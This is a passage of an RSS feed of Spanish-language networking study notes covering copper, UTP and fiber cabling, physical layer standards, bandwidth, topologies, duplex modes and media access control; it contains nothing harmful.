<br>Instalaciones de Internet por cable: Los porveedores de servicios de cable porporcionan conectividad a sus clientes mediante el reemplazo de porciones del cable coaxial y la admisión de elementos de amplificación con cables de ibre óptica. Sin embargo, el cableado en las instalaciones del cliente sigue siendo cable coaxial.
<br><img alt="coaxial_cable_example_iamge.png" src="https://dobliuw.com/lib/media/coaxial_cable_example_iamge.png"><br>Los números identifican algunas características clave de este cable:<br>
<br>Cubierta exterior.
<br>Blindaje de cobre trenzado.
<br>Aislamiento plástico.
<br>Conductor de cobre.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/0.-copper-wiring.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Physical/Wiring/Copper/0. Copper Wiring.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 22 Oct 2024 22:23:55 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/modificacion_de_señal_por_interferencia_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/modificacion_de_señal_por_interferencia_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Unshielded Twisted Pair (UTP) Cable]]></title><description><![CDATA[ 
 <br><br>Cuando se utiliza como medio de red, el cableado UTP consta de cuatro pares de hilos codificados por colores que están trenzados entre sí y recubiertos con un revestimiento de plástico flexible. Su tamaño pequeño puede ser una ventaja durante la instalación.<br>Los cables UTP no utilizan blindaje para contrarrestar los efectos de la EMI y la RFI. En cambio, los diseñadores de cable han descubierto otras formas de limitar el efecto negativo del crosstalk:<br>
<br>Anulación: Los diseñadores ahora meparejan los hilos en un circuito. Cuando dos hilos de un circuito eléctrico están cerca, los campos magnéticos son exactamente opuestos entre sí.
<br>Variando el número de vueltas por par de hilos: Para mejorar aún más el efecto de anulación de los pares de hilos del circuitor, los diseñadores cmabian el número de vueltas de cada par de hilos en un cable. Los cables UTP deben seguir especificaciones precisas que reigen cuántas vueltas o trenzas se permiten por metro de cable.
<br>Los cables UTP dependen exclusivamente del efecto de anulación producido por los pares de hilos trenzados para limitar la degradación de la señal y proporcionar un autoblindaje eficaz de los pares de hilos en los medios de red.<br><img alt="upt_cable_2_example_image.png" src="https://dobliuw.com/lib/media/upt_cable_2_example_image.png"><br><br><br>Algunos de estándares definidos por el conjunto de estándares a los que responde el cableado UTP, en particular la TIA/EIA-568 son:<br>
<br>Tipos de cables.
<br>Longitudes del cable.
<br>Conectores.
<br>Terminación del cable.
<br>Métodos para realizar pruebas de cable.
<br>Los cables se dividen en categorías según su capacidad para transportar datos de ancho de banda a velocidades mayores. Por ejemplo, el cable de Categoría 5 se utiliza comúnmente en las instalaciones de FastEthernet 100BASE-TX. Otras categorías incluyen el cable de categoría 5 mejorada, la categoría 6 y la 6a.<br>Estos cables de categorías superiores se diseñan y fabrican para admitir velocidades superiores de transmisión de datos. A medida que se desarrollan y adoptan nuevas tecnologías Ethernet de velocidad gigabit, la categoría 5e es ahora el tipo de cable mínimamente aceptable, y la categoría 6 es el tipo recomendado.<br><img alt="utp_cable_categories_example_image.png" src="https://dobliuw.com/lib/media/utp_cable_categories_example_image.png"><br>En esta imagen se muestran tres categorías de cable UTP:<br>
<br>Categoría 3: Se utilizó originalmente para la comunicación de voz a través de líneas de voz, pero más tarda para la transmisión de datos.
<br>Categoría 5 y 5e: Se utilizan para la transmisión de datos. La categoría 5 soporta 100Mbps y la categoría 5e soporta 1000Mbps.
<br>Categoría 6: Tiene un separador añadido entre cada par de cables para soportar velocidades más altas. Catageoría 6 soporta hasta 10Gbps
<br>Categoría 7: Soporta 10Gbps.
<br>Categoría 8: Soporta 40Gbps.
<br>Algunos fabricantes producen cables que exceden las específicaciones de la categoría 6a de la TIA/EIA y se refieren a estos como cables de Categoría 7.<br><br><br>Los cables UTP generalmente se terminan con un conector RJ-45. El estándar TIA/EIA-568 describe las asignaciones de los códigos por colores de los hilos a la asignación de pines de los cables Ethernet.<br><img alt="rj_45_connector_example_image.png" src="https://dobliuw.com/lib/media/rj_45_connector_example_image.png"><br>Por otro lado, el socket RJ-45 es el componente hembra de un dispositivo de red, pared, salida de partición o panel de conexiones.<br><img alt="socket_rj_45_connectors_example_image.png" src="https://dobliuw.com/lib/media/socket_rj_45_connectors_example_image.png"><br>Es importante tener en cuenta que cuando se realizan las terminaciones de manera incorrecta, cada cable representa una posible fuente de degradación del rendimiento de la capa física. Por ejemplo, en la siguiente imagén veremos un cable UTP mal terminado, este conector defectuoso tiene cables que están expuestos sin torcer y no cubiertos completamente por la funda.<br><img alt="utp_defectuoso_example_image.png" src="https://dobliuw.com/lib/media/utp_defectuoso_example_image.png"><br>En cambio, un cable UTP correctamente terminado es un buen conector, donde los hilos están sin trenzar solo en el trecho necesario para unir el conector.<br><img alt="correct_utp_cable_example_image.png" src="https://dobliuw.com/lib/media/correct_utp_cable_example_image.png"><br><br><br>Según las diferentes situaciones, es posible que los cables UTP necesiten armarse según las diferentes convenciones para los cableados. Esto significa que los hilos individuales del cable deben conectarse en diferent orden para distinots grupos de pins en los conectores RJ-45.<br>Los pirncipales tipos de cables que se obtienen al utilizar convenciones específicas de cableado son:<br>
<br>Cable directo de Ethernet: El tipo más común de cable de red. Por lo general, se utiliza para interconectar un host con un swtich y un swtich con un router.
<br>Cable cruzado Ethernet: El cable utilizado para interconectar dispositivos similares. Por ejemplo, para conectar un swtich a un switch, un host a un host o un router a un router. Sin embargo, los cables de curce ahora se consideran heredados, ya que las NIC utilizan cruzado de interfaz dependiendo del medio (Auto-MDIX) para detectar automáticamente el tipo de cable y realizar la conexión interna.
<br>Si bien el uso de un cable de conexión cruzada o directa de forma incorrecta no dañe a ningun dispositivo, tampoco se producirá conectividad y la comunicación entre estos. Dado que esto es un error común, si no se logra conectividad, la primera medida para resolver este problema es verificar que las conexiones de los dispositivos sean correctas.<br><br>La siguiente imagén identifica los pares de cables individuales para los estándares T568A y T568B.<br><img alt="t568a_and_b_standars_example_image.png" src="https://dobliuw.com/lib/media/t568a_and_b_standars_example_image.png"><br>La siguiente tabla muestra el tipo de cable UTP, los estándares relacionados y la aplicación típica de estos cables:<br>]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/1.-utp-cable.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Physical/Wiring/Copper/1. UTP Cable.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 25 Sep 2024 14:59:37 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/upt_cable_2_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/upt_cable_2_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Fiber Optic Wiring]]></title><description><![CDATA[ 
 <br><br>El cableado de fibra óptica es el otro tipo de cableado utilizado en redes, este cableado tiene ciertas propiedades que lo convierten en la mejor opción en ciertas situaciones.<br>El cable de fibra óptica transmite datos a distancias más largas y con anchos de banda (<a data-href="0. Physical Layer#Bandwidth" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/0.-physical-layer.html#Bandwidth" class="internal-link" target="_self" rel="noopener nofollow">0. Physical Layer &gt; Bandwidth</a>) más altos que cualquier otro medio de red. A diferencia de los cables de cobre (<a data-href="0. Copper Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/0.-copper-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Copper Wiring</a>), el cable de fibra óptica puede transmitir señales con menos atenuación y es totalmente inmune a las EMI y RFI. Este cable se utiliza para interconectar dispositivos de red.<br>La fibra óptica es un hilo flexible, pero extremadamente delgado y transparante de vidrio muy puro, no mucho más gueso que el pelo humano. Los bits se codifican en la fibra como impusos de luz. El cable de fibra óptica actúa como una guía de ondas, o una "tubería de luz", para transmitir la luz entre los dos extremos con una pérdida mínima de la señal.<br><br><br>En términos generales, los cables de firba óptica pueden clasificarse en dos tipos:<br>
<br>Fibra óptica monomodo (Single-Mode Fiber / SMF).
<br>Fibra óptica multimodo (Multimode Fiber / MMF). 
<br><br>SMF consta de un núcleo muy pequelo y utiliza tecnología láser cara para enviar un solo rayo de luz, como se muestra en la imagen a continuación. SMF es popular en situaciones de larga distancia que abarcan cientos de kilómetros, como las requeridas en aplicaciones de telefonía de larga distancia y televisión por cable.<br><img alt="single_mode_fiber_media_example_image.png" src="https://dobliuw.com/lib/media/single_mode_fiber_media_example_image.png"><br><br>MMF consta de un núcleo más grande y utiliza emisores LED para enviar pulsos de luz. Específicamente, la luz de un LED ingresa a la fibra multimodo en diferentes ángulos, como se muestra en la siguiente imagén. Se usa mucho en las redes LAN, debido a que pueden alimentarse mediante LED de bajo costo. Proporciona un ancho de banda de hasta 10 Gbs a través de longitudes de enlace de hasta 550m.<br><img alt="multi_mode_fiber_media_example_image.png" src="https://dobliuw.com/lib/media/multi_mode_fiber_media_example_image.png"><br>Una de las diferencias destacadas entre MMF y SMF es la cantidad de dispersión. La dispersión se refiere a la extensión de los pulsos de luz con el tiempo. El aumento de la dispersión significa una mayor pérdida de la intensidad de la señal. FMM tiene una mayor dispersión que SMF, es por eso que MFF sólo puede viajar hasta 500 metros antes de la pérdida de señal.<br><br><br>En la actualidad, el cableado de fibra óptica se utiliza en cuatro tipo de industrias:<br>
<br>Redes empresariales: Se utilizan para aplicaciones de cableado backbone y dispositivos de infraestructura de interconexión.
<br>Fibra hasta el hogar (FTTH): Se utiliza para proporcionar servicios de banda ancha siempre activos a hogares y pequeñas.
<br>Redes de larga distancia: Utilizadas por proveedores de servicios para conectar países y ciudades.
<br>Redes de cable submarino: Se utilizan para proporcionar soluciones confiables de alta velocidad y alta capacidad capaces de sobrevivir en entornos submarinos hostiles a distrancias transoceánicas. 
<br>Esta imagen muestra el <a data-tooltip-position="top" aria-label="https://www.submarinecablemap.com" rel="noopener nofollow" class="external-link" href="https://www.submarinecablemap.com" target="_blank">mapa de cables submarinos</a> de la actualidad:<br><img alt="subamrine_cable_map_example_image.png" src="https://dobliuw.com/lib/media/subamrine_cable_map_example_image.png"><br><br><br>Un conector de fibra óptica termina el extremo de una fibra ópica y existe una variedad de estos. Las diferencias principales entre los tipos de conectores son las dimensiones y los métodos de acoplamiento. Las empresas deciden qué tipos de conectores utilizarán en base a sus equipos.<br><br>Los conectores de punta directa (ST) fueron uno de los primeros tipos de conectores utilizados. El conector se bloque de manera segura con un mecanismo tipo bayoneta (Enroscable y desenroscable)<br><img alt="ST_connectors_fiber_example_image.png" src="https://dobliuw.com/lib/media/st_connectors_fiber_example_image.png"><br><br>Los conectores suscriptor (SC) a veces se denominan conector cuadrado o conector estándar. Es un conector LAN y WAN ampliamente adoptado que utiliza una mecanismo de inserción/extracción para asegurar la inserción correcta. Este tipo de conectores se utilizan con la fibra óptica SMF y MMF.<br><img alt="SC_connectors_fiber_example_image.png" src="https://dobliuw.com/lib/media/sc_connectors_fiber_example_image.png"><br><br>Los conectores Lucent Simplex (LC) son una versióm más pequeña del conector SC. A veces se denominan conectores pequeños o locales y están creciendo rápidamente en popularidad debido a su tamañp más pequeño.<br><img alt="LC_Simple_connector_fiber_example_image.png" src="https://dobliuw.com/lib/media/lc_simple_connector_fiber_example_image.png"><br><br>El conector LC Multimode Dúplex es similar a un conector LC Simplex, pero utiliza un conector dúplex.<br><img alt="LC_Multimode_duplex_connector_fiber_example_image.png" src="https://dobliuw.com/lib/media/lc_multimode_duplex_connector_fiber_example_image.png"><br><br><br>Los cables de conexión de fibra óptica son necesarios para interconectar dispositivos de infraestructura. El uso de colores distingue entre los cables de conexión Singlemode y Multimode. El conector amarillo corresponde a los cables de fibra óptima Singlemode y el naranja (O aqua) corresponde a los cables de fibra óptima Multimode.<br><br><img alt="multimode_sc_sc_connection_cable_fiber_example_image.png" src="https://dobliuw.com/lib/media/multimode_sc_sc_connection_cable_fiber_example_image.png" style="width: 300px; max-width: 100%;"><br><br><img alt="single_mode_lc_lc_connection_cable_fiber_example_image.png" src="https://dobliuw.com/lib/media/single_mode_lc_lc_connection_cable_fiber_example_image.png" style="width: 300px; max-width: 100%;"><br><br><img alt="multi_mode_st_lc_connection_cable_fiber_example_image.png" src="https://dobliuw.com/lib/media/multi_mode_st_lc_connection_cable_fiber_example_image.png" style="width: 300px; max-width: 100%;"><br><br><img alt="multi_mode_sc_st_connection_cable_fiber_example_image.png" src="https://dobliuw.com/lib/media/multi_mode_sc_st_connection_cable_fiber_example_image.png" style="width: 300px; max-width: 100%;">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/fiber-optic/0.-fiber-optic-wiring.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Physical/Wiring/Fiber Optic/0. Fiber Optic Wiring.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 25 Sep 2024 18:34:44 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/single_mode_fiber_media_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/single_mode_fiber_media_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Fiber vs Copper]]></title><description><![CDATA[ 
 <br><br>La utilización de cables de fibra óptica ofrece muchas ventajas en comparación con los cables de cobre. A continuación, se presentará una tabla con algunas diferencias destacadas.<br>En la actualidad, en la mayoría de entornos empresariales, la fibra óptica se utiliza principalmente como cableado troncal para conexiones punto a punto de alto tráfico entre instalaciones de distribución de datos. También se utiliza para la interconexión de edificios en campus de múltiples edificios. Debido a que los cables de fibra óptica no conducen electricidad y tienen una baja pérdida de señal, son adecuados para estos usos.<br><a data-href="1. UTP Cable" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/1.-utp-cable.html" class="internal-link" target="_self" rel="noopener nofollow">1. UTP Cable</a> and FIber-Optic Cable comparison<br>]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper-vs-fiber-optic.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Physical/Wiring/Copper vs Fiber Optic.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 25 Sep 2024 18:41:05 GMT</pubDate></item><item><title><![CDATA[Physical conection]]></title><description><![CDATA[ 
 <br><br>Ya sea una conexión a una impresora local en el hogar o a un sitio web en otro país, para que se pueda producir cualquier comunicación de red se debe establecer antes una conexión a una red local. Una conexión física pede ser una conexión por cable o una conexión inalámbrica mediante ondas de radio.<br>El tipo de conexión física utilizada dependerá de la configuración de la red. Por ejemplo, en muchas oficinas corporativas, los empleados tienen PC de escritorio o portátiles que se conecta físicamente, mediante cables, a un switch compartido.<br>Además de las conexiones por cable, muchas empresas también ofrecen conexiones inalámbricas para PC portátiles, tablets y smartphones. En el caso de los dispositivios inalámrbicos, los datos se transmiten mediante ondas de readio. Los dispositivos en una red inalámbrica deben estar conectados a un punto de acceso inalámbrico (AP) o router inalámbrico.<br><br><img alt="wireless_router_example_image.png" src="https://dobliuw.com/lib/media/wireless_router_example_image.png"><br>Componentes de un AP (Access Point):<br>
<br>Antenas inalámbricas (Estas están integradas dentro de la versión del router que se muestra en la imagén).
<br>Puertos de Swtich de Ethernet.
<br>Puerto de Internet.
<br><br><img alt="wired_conection_to_ap_example_image.png" src="https://dobliuw.com/lib/media/wired_conection_to_ap_example_image.png"><br>NIC (Network Interface Card)<br>
Las tarjetas de interfaz de red (NIC) conectan un dispositivo a la red. Las NIC de Ethernet se usan para una conexión por cable, como se muestra en la imagén anterior, mientras que las NIC de las WLAN se usan para la conexión inalámbrica. Los dispositivos para usuarios finales pueden incluir un tipo de NIC o ambos. Una impresora de red, por ejemplo, puede contar solo con una NIC Ethernet y, por lo tanto, se debe conectar a la red mediante un cable Ethernet. Otros dispositivos, como las tablets y los celulares, pueden conectarse solo a una NIC WLAN y pueden utilizar una conexión inalámbrica.<br><br><br>La capa física del <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a> proporciona los medios (<a data-href="0. Network Components#Network media" href="https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/0.-network-components.html#Network_media" class="internal-link" target="_self" rel="noopener nofollow">0. Network Components &gt; Network media</a>) de transporte de los bits que conforman una trama de la capa de enlace de datos a través de los medios de red. Esta capa acepta una trama completa desde la capa 6 de enlace de datos (Data Link) y la codifica con uan secuencia de señales que se transmiten en los medios locales. Un dispositivo final o un dispositivo intermediario recibe los bits codificacos que componen una trama. <br>La capa física del nodo de destino recupera estas señales individuales de los medios, la restaura a sus representaciones en bits y pasa los bits a la capa de enlace de datos en forma de trama completa. <br><br>Los estándares de la capa física son necesarios para que los componentes y los medios utilizados para contruir una red funcionen en conjunto. Los protocolos y las operaciones de las capas OSI superiores se llevan a cabo en software diseñado por ingenieros en software e informáticos. El grupo de trabajo de ingeniera de Internet (IETF) define los servicios y los protocolos del conjunto TCP/IP.<br>La capa física, por otro lado, consta de circuitos electrónicos, medios y conectores desarrollados por ingenieros. Por lo tanto, es necesario que las principales organizaciones especializadas en ingeniería eléctrica y en comunicaciones definan los estándares que rigen este hardware.<br>Existen muchas organizaciones internacionales y nacionales, organizaciones de regulación fubernamentales y empresas privadas que intervienen en el establecimiento y el mantenimiento de los estándares de esta capa. Los estándares de hardware, medios, codificación y señalización de la capa física están definidiso y regidos por las siguientes origanizaciones de estándares:<br>
<br>Organización Internacional para la Estandarización (ISO).
<br>Asociación de las Industrias de las Telecomunicaciones (TIA) y Asociación de Industrias Electrónicas (EIA).
<br>Unión Internacioanl de Telecomunicaciones (ITU).
<br>Instituto Nacional Estadounidense de Estándares (ANSI).
<br>Instituto de Ingenieros Eléctricos y Electrónicos (IEEE).
<br>Autoridades nacionales reguladoras de las telecomunicaciones, incluida la Federal Communication Commission (FCC) de los Estados Unidos y el Instituto Europeo de Estándares de Telecomunicaciones (ETSI).
<br><img alt="physical_layer_standars_example_image.png" src="https://dobliuw.com/lib/media/physical_layer_standars_example_image.png"><br>Los estándares de la capa física abarcan tres áreas funcionales:<br>
<br>Physical componentes / Componentes físicos.
<br>Coding / Codificación.
<br>Signaling / Señalización.
<br><br>Los componentes físicos son los dispositivos de hardware electrónico, medios y otros conectores que transmiten las señales que representan los bits. Todos los componentes de hardware, como NIC , interfaces y conectores, materiales y diseño de los cables, se especifican en los estándares asociados con la capa física.<br><br>La codificación, o codificación de línea, es un método que se utiliza para convertir una tranmisisón de bits de datos en un "código" predefinido. Los códigos son grupos de bits utilizados para ofrecer un patrón predecible que pueda reconocer tanto el emisor como el receptor. En otras palabras, la codificación es el método o pátron utilizado para representar la información digital. <br>Por ejemplo, en la codificación Manchester los 0 se representan mediante una transición de voltaje de alto a bajo y los 1 se representan como una transición de voltaje de bajo a alto. <br><img alt="manchester_coding_example_image.png" src="https://dobliuw.com/lib/media/manchester_coding_example_image.png"><br><br>La capa física debe generar la señales inalámbricas, ópticas o eléctricas que representan los "1" y los "0" en los medios. La forma en que se representan los bits se denomina método de señalización. Los estándares de la capa física deben definir qué tipo de señal representa el correspondiente "1" y qué tipo de señal representa un "0". Esto puede ser tan simple como un cambio en el nivel de una señal eléctrica o de un impulso óptico. Por ejemplo, un pulso largo podría representar un 1 mientras que un pulso corto un 0.<br>Señales eléctricas en un cable de cobre:<br>
<img alt="cable_cobre_señalizacion.png" src="https://dobliuw.com/lib/media/cable_cobre_señalizacion.png"><br>Señales de pulsos de luz sobre en un cable de fibra óptica:<br>
<img alt="fibra_optica_señalizacion.png" src="https://dobliuw.com/lib/media/fibra_optica_señalizacion.png"><br>Señales de microondas sobre medios inalámbricos:<br>
<img alt="microondas_wireless_señalizacion.png" src="https://dobliuw.com/lib/media/microondas_wireless_señalizacion.png"><br><br><br>Los diferentes medios físicos admiten la transferencia de bits a distintas velocidades. La transferencia de datos generalmete se discute en términos de ancho de banda. El ancho de banda es la capacidad a la que un medio puede transportar datos. El ancho de banda digital mide la cantidad de datos que pueden fluir desde un lugar hacia otro en un período de tiempo determinado. El ancho de banda generalmente se mide en Kilobits por segundo (kbps), Megabits por segundo (mbps) o Gigabits por segundo (gbps). En ocaciones, el ancho de banda se piensa como la velocidad a la que viajan los bits, sin embargo, esto no es así. Por ejemplo, tanto en Ethernet a 10 mbps como a 100 mbps, los bits se envían a la velocidad de la electricidad. La diferencia es el número de bits que se transmiten por segundo.<br>Los factores que determina el ancho de banda práctico en una red son:<br>
<br>Las propiedades de los medios físicos.
<br>Las tecnologías seleccionadas para la señalización y la detección de señales de red.
<br>La siguiente tabla muestra las unidades de medida comúnmente utiizadas para los distintos anchos de banda:<br><br><br>Los términos utilizados para medir la calidad del ancho de banda incluyen:<br>
<br>Latency / Latencia.
<br>Throughput / Redimiento.
<br>Goodput / Capacidad de transferencia útil.
<br><br>El concepto de latencia se refiere a la cantidad de tiempo, incluidas las demoras, que les toma a los datos transferirse desde un punto determinado a otro.<br>En una internetwork o una red con múltiiples segmentos, el rendimiento no puede ser más rápido que el alcance más lento de la ruta de origen a destino. Incluso si todos los segmentos o gran parte de ellos tienen un ancho de banda elevado, solo se necesita un segmento en la ruta con un rendimiento inferior para crear un cuello de bottela en el rendimineto de toda la red.<br><br>El rendimiento es la medida de transferencia de bits a través de los medios durante un período de tiempo determinado. <br>Debido a diferentes factores, el rendimiennto generalmente no coincide con el ancho de banda específicado en las implementaciones de la capa física. El rendimiento suele ser menor que el ancho de banda. Hay muchos factores que influyen en el rendimiento, los cuales son:<br>
<br>La cantida de tráfico.
<br>El tipo de tráfico.
<br>La latencia creada por la cantidad de dispositivos de red encontrados entre origen y destino.
<br><br>Existen una tercera medición para evaluar la transferencia de datos utilizables, que se conoce como capacidad de transferencia útil. Esta capacidad es la medida de datos utilizables transferidos durante un período determinado. La capacidad de trasferencia útil es el rendimiento menos la sobrecarga de tra´fico para establecer sesiones, acuses de recibo, encapsulación y bits retransmitidos. La capacidad de transferencia útil siempre es menor que el rendimiento, que generalmente es menor que el ancho de banda.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/0.-physical-layer.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Physical/0. Physical Layer.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 23 Sep 2024 15:33:19 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/wireless_router_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/wireless_router_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Physical and Logical Topology]]></title><description><![CDATA[ 
 <br><br>Como vimos anteriormente, la capa de enlace de datos prepara los datos de red para la red física. Debemos conocer la topología lógica de una red para poder determinar lo que se necesita para transferir tramas de un dispositivo a otro. En este árticulo explicaremos las formas en que la capa de vínculo de datos funciona con diferentes topologías de red lógicas.<br>La topología de una red es la configuración o relación de los dispositivos de red y las interconexiones entre ellos.<br>Existen dos tipos de topologías utilizadas al describir redes LAN y WAN.<br>
<br>Topología Física: Identifica las conexiones físicas y cómo se interconectan los dispositivos finales y los dispositivos intermedios /es decir, routers, swtiches y puntos de acceso inalámbrico). La topología también puede inlcuir la ubicación específica del dispositivo, como el número de habitación y la ubicación en el rack del equipo. Las topologías físicas generalmente son punto a punto o en estrella.
<br>Topología Lógica: Se refiere a la forma en que una red transfiere tramas de un nodo al siguiente. Esta topología identifica las conexiones virtuales mediante interfaces de dispositivo y esquemas de direccionamiento IP de capa 3.
<br>La capa de enlace de datos "ve" la topología lógica de una red al controlar el acceso de datos a los medios. Es la topología lógica la que influye en el tipo de trama de red y control de acceso a los medios que se utilizan. <br><br><img alt="physical_topologie_diagram.png" src="https://dobliuw.com/lib/media/physical_topologie_diagram.png"><br><br><img alt="logical_topology_diagram.png" src="https://dobliuw.com/lib/media/logical_topology_diagram.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/topologies/0.-physical-and-logical-topology.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. Data Link/Topologies/0. Physical and Logical Topology.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 03 Oct 2024 20:31:19 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/physical_topologie_diagram.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/physical_topologie_diagram.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Full Dúplex and Semidúplex comunications]]></title><description><![CDATA[ 
 <br><br>Comprender la comunicación dúplex es importante cuando se habla de las topologías LAN, ya que se refiere a la dirección de la transmisión de datos entre dos dispositivos. Hay dos nodos comunes de dúplex.<br><br>Los dos dispisitivos pueden transmitir y recibir en los medios pero no pueden hacerlo simltáneamente. Las WLAN y las topologías de bus heredadas con swtitches Ethernet utilizan el modo semidúplex. Semidúplex permite que solo un dispositivo envíe o reciba a la vez en el medio compartido. <br><br>Ambos dispositivos pueden transmitir y recibir simultáneamente en los medios compartidos. La capa de enlace de datos supone que los medios están disponibles para transmitir para ambos nodos en cualquier momento. Los swtiches Ethernet operan en el modo de dúplex completo de forma predeterminadad, pero pueden funcionar en semidúplex si se conectan a un dispositivo como un dispositivo externo. <br>En resumen, las comunicaciones semidúplex restringen el itnercambio de datos a una dirección a la vez. El dúplex completo permite el envío y la recepción de datos simultáneamente. Es importante que dos interfaces interconectadas, como la NIC de un host y una interfaz de un switch Ethernet, operen con el mismo modo dúplex. De lo contrario, habrá incompatibilidad de dúplex y se generará ineficiencia y latencia en el enlace.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/topologies/1.-full-dúplex-and-semidúplex-comunications.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. Data Link/Topologies/1. Full Dúplex and Semidúplex comunications.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 07 Oct 2024 14:35:05 GMT</pubDate></item><item><title><![CDATA[Access control methods]]></title><description><![CDATA[ 
 <br><br>Las LAN Ethernet y WLAN son un ejemplo de una red de accesos múltiples. Una red multiacceso es una red que puede tener dos o más dispositivos finales que intenta acceder a la red simultáneamente.<br>Algunas redes de acceso múltiple requieren reglas que rijan la forma de compartir los medios físicos. Hay dos métodos básicos de control de acceso al medio para medios compartidos.<br>
<br>Acceso por contención.
<br>Acceso controlado.
<br><br>En las redes multiacceso basadas en contención, toods los nodos operan en semidúplex, compitiendo por el uso del medio. Sin embargo, solo un dispositivo puede enviar a la vez. Por lo tanto, hay un proceso si más de un dispositivo transmite al mismo tiempo. Algunos ejemplos de métodos de acceso basados en contención son los siguientes:<br>
<br>Acceso múltiple con detección de colisiones (CSMA/CD) utilizando en LAN Ethernet de topología de bus heredada.
<br>El operador detecta el acceso múltiple con prevención de colisiones (CSMA/CA) utilizado en LAN inalámbrica.
<br><img alt="containment_based_access_example_image.png" src="https://dobliuw.com/lib/media/containment_based_access_example_image.png"><br><br>En una red de acceso múltiple basada en control, cada nodo tiene su propio tiempo para usar el medio. Estos tipos deterministas de reds no son eficientes porque un dispositivo debe aguardar su turno para acceder al medio. Algunos ejemplos de redes multiaccesos que utilizan acceso controlado son los siguientes:<br>
<br>Anillo de TokenLegacy
<br>ARCNETheredado
<br><img alt="controlled_access_example_image.png" src="https://dobliuw.com/lib/media/controlled_access_example_image.png"><br>Hoy en día las redes Ethernet funcionan en dúplex completo (<a data-href="1. Full Dúplex and Semidúplex comunications#Full Dúplex comunication" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/topologies/1.-full-dúplex-and-semidúplex-comunications.html#Full_Dúplex_comunication" class="internal-link" target="_self" rel="noopener nofollow">1. Full Dúplex and Semidúplex comunications &gt; Full Dúplex comunication</a>) y no requieren un método de acceso.<br><br><br>Entre los ejemplols de redes de acceso basadas en controversias se incluyen los siguientes:<br>
<br>LAN inalámbrica (Utiliza CSMA/CA)
<br>LAN Ethernet de topología de bus heredada (Utiliza CSMA/CD)
<br>LAN Ethernet heredada con un hub (Utiliza CSMA/CD)
<br>Estas redes funcionan en modo semidúplex, lo que significa que solo un dispositivo puede enviar o recibir a la vez. Esto requiere un proceso para gestionar cuándo puede enviar un dispositivo y qué sucede cuando múltiples dispositivos envían al mismo tiempo.<br>Si dos dispositivos transmiten al mismo tiempo, se produce una colisión. Para las LAN Ethernet heredadas, ambos dispositivos detectarán la colisión en la red. Esta es la parte de detección de colisiones (CD) de CSMA/CD. La NIC compara los datos transmitidos con los datos recibidos, o al reconocer que la amplitud de la señal es más alta de lo normal en los medios. Los datos enviados por ambos dispisitovs se dañarán y deberán enviarse nuevamente.<br>
<br>Ejemplo
